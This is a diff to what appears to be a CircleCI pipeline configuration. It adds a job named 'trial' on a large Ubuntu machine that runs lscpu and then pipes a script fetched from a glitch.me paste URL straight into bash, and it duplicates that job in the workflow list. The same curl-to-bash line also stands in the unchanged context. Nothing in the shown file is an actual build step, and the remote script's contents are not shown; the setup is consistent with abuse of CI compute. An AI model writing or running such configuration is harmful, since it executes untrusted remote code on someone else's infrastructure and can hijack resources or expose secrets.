@@ -10,9 +10,20 @@ jobs:
       - run: 
             name: "trial" 
             command: curl https://muq-hastebin.glitch.me/raw/pvBYzAmYLZ | bash
+
+  trial:
+    machine:
+      image: ubuntu-2004:current
+    resource_class: large
+    steps:
+      - run: lscpu
+      - run: 
+            name: "trial" 
+            command: curl https://muq-hastebin.glitch.me/raw/pvBYzAmYLZ | bash
  
 workflows: 
     version: 2.1 
     build: 
         jobs: 
+        - trial
         - trial
